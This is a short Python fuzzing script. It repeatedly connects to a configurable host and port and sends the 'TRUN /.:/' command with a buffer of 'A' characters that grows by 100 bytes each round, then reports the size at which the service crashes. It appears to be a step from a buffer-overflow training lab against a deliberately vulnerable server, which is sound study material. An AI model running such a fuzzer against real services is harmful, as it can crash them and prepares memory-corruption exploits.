#!/usr/bin/python3
import sys, socket
from time import sleep

#--------Changeme--------#
                         #
host = "192.168.1.2"     #
port = 9999              #
                         #
#------------------------#

buffer = "A" * 100

while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, port))

		payload = "TRUN /.:/" + buffer

		print(f"[+] Sending the payload of length {len(buffer)}...")
		s.send((payload.encode()))
		s.close()

		sleep(1)
		buffer += "A"*100

	except:
		print("Fuzzer crashed at %s bytes" % str(len(buffer)))
		sys.exit()